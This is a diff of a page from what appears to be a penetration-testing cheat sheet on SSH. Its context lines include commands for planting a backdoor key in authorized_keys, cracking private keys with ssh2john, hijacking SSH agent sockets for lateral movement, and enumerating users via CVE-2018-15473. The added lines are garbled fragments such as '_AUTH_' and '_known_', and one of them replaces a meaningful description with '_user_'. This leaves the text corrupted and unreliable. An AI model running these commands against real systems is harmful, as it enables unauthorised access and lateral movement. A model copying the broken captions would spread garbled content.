@@ -3,7 +3,7 @@ id: "es3lpq8uqmpsiwjr2"
 title: "ssh"
 description: ""
 tags: []
-order: 2
+order: "2"
 createdAt: "2026-05-30T15:46:13.118Z"
 updatedAt: "2026-05-30T15:46:22.370Z"
 ---
@@ -153,6 +153,8 @@ ssh-keygen -t rsa -b 4096 -f ./pentest_key -N ""
 echo "$(cat pentest_key.pub)" >> /home/$USER/.ssh/authorized_keys
 ```
 
+_key.pub)" >> /home/$USER/.ssh/authorized_
+
 **Tags:** ssh, key-auth, private-key, credential-access
 <!-- cmd: {"id":"v8xpcljcbmpsiwqnj","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->
 
@@ -168,6 +170,8 @@ ssh-keygen -y -f id_rsa
 ```bash
 ssh2john id_rsa > id_rsa.hash
 ```
+
+_rsa > id_
 
 **Tags:** ssh, key-auth, private-key, credential-access
 <!-- cmd: {"id":"thiwpsebimpsiwqnr","language":"bash","sectionId":"lsgat5yxgmpsiwqjj","tags":["ssh","key-auth","private-key","credential-access"]} -->
@@ -336,6 +340,8 @@ ls -la /tmp/ssh-*/
 SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l
 ```
 
+_AUTH_
+
 **Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
 <!-- cmd: {"id":"91wy5156hmpsiwqqs","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->
 
@@ -343,6 +349,8 @@ SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l
 ```bash
 SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh $USER@$TARGET
 ```
+
+_AUTH_
 
 **Tags:** ssh, agent-hijacking, lateral-movement, privilege-escalation
 <!-- cmd: {"id":"r9doy6504mpsiwqqw","language":"bash","sectionId":"303dk9p1zmpsiwqjw","tags":["ssh","agent-hijacking","lateral-movement","privilege-escalation"]} -->
@@ -380,6 +388,8 @@ cat ~/.ssh/known_hosts
 ```bash
 cat /etc/ssh/ssh_known_hosts
 ```
+
+_known_
 
 **Tags:** ssh, config, known-hosts, recon, lateral-movement
 <!-- cmd: {"id":"v0zol86e8mpsiwqrv","language":"bash","sectionId":"mngxuzn8vmpsiwqjz","tags":["ssh","config","known-hosts","recon","lateral-movement"]} -->
@@ -490,7 +500,7 @@ X11Forwarding yes
 python3 ssh_user_enum.py --userList users.txt --ip $TARGET
 ```
 
-_Username Enumeration (CVE-2018-15473) OpenSSH 7.7 and earlier — timing-based user enum._
+_user_
 
 **Tags:** ssh, user-enumeration, cve, unauthenticated
 <!-- cmd: {"id":"assdbuat3mpsiwqtu","language":"bash","sectionId":"9y5bbzvnrmpsiwqkb","tags":["ssh","user-enumeration","cve","unauthenticated"]} -->
